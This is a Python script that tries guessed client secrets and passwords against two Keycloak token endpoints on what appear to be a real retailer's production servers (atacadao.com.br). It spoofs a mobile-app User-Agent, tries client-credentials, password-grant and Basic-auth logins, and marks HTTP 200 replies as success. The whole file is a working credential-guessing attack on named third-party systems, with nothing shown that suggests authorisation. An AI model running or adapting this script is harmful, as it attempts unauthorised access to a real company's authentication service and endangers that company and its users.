"""Try several credential combinations against the Keycloak token endpoint."""
import base64
import itertools
import urllib.error
import urllib.parse
import urllib.request

TOKEN_URLS = [
    "https://skadi-prod.portal.atacadao.com.br/realms/R-Mobile_Backend_Token-KC/protocol/openid-connect/token",
    "https://freyr.portal.atacadao.com.br/infosec/auth/v1/protocol/openid-connect/token",
]
CLIENT_ID = "OfertaMobile-TokenAuth"
USERNAME = "kcc-ofertas-externo"


def post(url, form, headers=None):
    data = urllib.parse.urlencode(form).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "okhttp/4.12.0")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, resp.read().decode(errors="replace")[:200]
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")[:200]
    except Exception as exc:
        return -1, str(exc)[:200]


secret_candidates = ["", CLIENT_ID, USERNAME, "kcc-ofertas-externo", "oferta", "ofertas",
                     "Atacadao", "atacadao", "OfertaMobile"]
seen = set()
for url in TOKEN_URLS:
    print(f"\n########## {url}")
    for grant in ("client_credentials", "password"):
        for secret in secret_candidates:
            form = {"grant_type": grant, "client_id": CLIENT_ID}
            if grant == "password":
                form["username"] = USERNAME
                form["password"] = secret or USERNAME
            if secret:
                form["client_secret"] = secret
            key = (url, grant, tuple(sorted(form.items())))
            if key in seen:
                continue
            seen.add(key)
            status, body = post(url, form)
            flag = "  <<<<< SUCCESS" if status == 200 else ""
            print(f"  {grant} secret={secret!r:30} -> {status} {body[:120]}{flag}")

    # Basic auth variant
    basic = base64.b64encode(f"{CLIENT_ID}:{CLIENT_ID}".encode()).decode()
    status, body = post(
        url,
        {"grant_type": "client_credentials"},
        {"Authorization": f"Basic {basic}"},
    )
    print(f"  basic(client_id:client_id) -> {status} {body[:120]}")
